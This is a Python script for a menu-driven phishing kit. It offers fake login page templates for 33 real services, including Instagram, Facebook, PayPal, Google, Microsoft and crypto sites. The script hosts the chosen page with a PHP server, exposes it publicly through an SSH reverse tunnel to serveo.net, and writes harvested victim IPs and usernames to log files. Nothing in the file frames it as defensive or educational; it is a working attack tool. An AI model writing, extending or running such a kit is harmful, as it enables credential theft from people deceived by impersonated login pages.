
import os
import sys
import subprocess
import time
import webbrowser
import argparse
import json
from urllib.parse import urlparse

try:
    from theme import print_banner, colors, print_colored
    from config import config

    def handle_special_commands(user_input):
        """Handle special commands like theme toggle and quit"""
        if user_input.upper() == 'T':
            old_theme = "DARK" if config.dark_mode else "LIGHT"
            config.toggle_dark_mode()
            colors.update_colors()
            new_theme = "DARK" if config.dark_mode else "LIGHT"
            print_banner()
            print_colored(f"Theme changed from {old_theme} to {new_theme}", colors.SUCCESS)
            return True
        elif user_input.upper() == 'Q':
            print_colored("Goodbye!", colors.PRIMARY)
            sys.exit(0)
        return False

    def main_loop():
        while True:
            print_banner()

            print_colored("                       Available Templates\n", colors.PRIMARY, bold=True)

            template_list = [
                "[1] Instagram          [2] Facebook            [3] Snapchat",
                "[4] Twitter            [5] GitHub              [6] Google", 
                "[7] Spotify            [8] Netflix             [9] PayPal",
                "[10] Origin            [11] Steam              [12] Yahoo!",
                "[13] LinkedIn          [14] Protonmail         [15] Wordpress",
                "[16] Microsoft         [17] IGFollowers        [18] eBay",
                "[19] Pinterest         [20] CryptoCurrency     [21] Verizon",
                "[22] DropBox           [23] Adobe ID           [24] Shopify",
                "[25] FB Messenger      [26] GitLab             [27] Twitch",
                "[28] MySpace           [29] Badoo              [30] VK",
                "[31] Yandex            [32] devianART          [33] Custom"
            ]

            for line in template_list:
                print_colored(line, colors.SECONDARY)

            print_colored("\nSpecial Commands:", colors.INFO)
            print_colored("[T] Toggle Dark/Light Mode", colors.ACCENT)
            print_colored("[Q] Quit Application", colors.ERROR)
            print_colored("\nPlease Choose A Number To Host Template:", colors.PRIMARY)
            
            templates = {
                '1': 'instagram',
                '2': 'facebook',
                '3': 'snapchat',
                '4': 'twitter',
                '5': 'github',
                '6': 'google',
                '7': 'spotify',
                '8': 'netflix',
                '9': 'paypal',
                '10': 'origin',
                '11': 'steam',
                '12': 'yahoo',
                '13': 'linkedin',
                '14': 'protonmail',
                '15': 'wordpress',
                '16': 'microsoft',
                '17': 'igfollowers',
                '18': 'ebay',
                '19': 'pinterest',
                '20': 'cryptocurrency',
                '21': 'verizon',
                '22': 'dropbox',
                '23': 'adobeid',
                '24': 'shopify',
                '25': 'fbmessenger',
                '26': 'gitlab',
                '27': 'twitch',
                '28': 'myspace',
                '29': 'badoo',
                '30': 'vk',
                '31': 'yandex',
                '32': 'devianart',
                '33': 'create'
            }
            
            try:
                number = input(f"{colors.YELLOW}[{colors.RESET}?{colors.YELLOW}]{colors.RESET}> ")
                
                # Handle special commands
                if handle_special_commands(number):
                    continue
                
                if number == "18":
                    print_colored("Ebay Currently Does Not Work. Choose Another..", colors.ERROR)
                    input("Press Enter to continue...")
                    continue
                
                if number not in templates:
                    print_colored("Invalid choice. Please try again.", colors.ERROR)
                    input("Press Enter to continue...")
                    continue
                    
                choice = templates[number]
                print_colored(f"Loading {choice}", colors.INFO)
                
                print_colored("\nEnter A Custom Subdomain:", colors.PRIMARY)
                subdom = input(f"{colors.YELLOW}[{colors.RESET}?{colors.YELLOW}]{colors.RESET}> ")
                
                if not subdom.strip():
                    print_colored("Subdomain cannot be empty. Please try again.", colors.ERROR)
                    input("Press Enter to continue...")
                    continue
                
                print_colored(f"Starting Server at {subdom}.serveo.net...", colors.SUCCESS)
                print_colored(f"Logs Can Be Found In sites/{choice}/ip.txt and sites/{choice}/usernames.txt", colors.INFO)
                
                cmd_line = f"sudo php -t sites/{choice} -S 0.0.0.0:80 & ssh -R {subdom}.serveo.net:80:0.0.0.0:80 serveo.net"
                
                print_colored(f"Executing: {cmd_line}", colors.WARNING)
                print_colored("Press Ctrl+C to stop the server", colors.INFO)
                
                try:
                    p = subprocess.Popen(cmd_line, shell=True)
                    p.wait()
                except KeyboardInterrupt:
                    print_colored("\nServer stopped by user", colors.WARNING)
                    p.terminate()
                    input("Press Enter to return to main menu...")
                    continue
                    
            except KeyboardInterrupt:
                print_colored("\nGoodbye!", colors.PRIMARY)
                sys.exit(0)
            except Exception as e:
                print_colored(f"An error occurred: {e}", colors.ERROR)
                input("Press Enter to continue...")
                continue

    # Start the main loop
    main_loop()

except KeyboardInterrupt:
    print_colored("\nGoodbye!", colors.PRIMARY)
    sys.exit(0)
except ImportError as e:
    print(f"Error importing modules: {e}")
    print("Make sure theme.py and config.py are present and correct.")
    sys.exit(1)
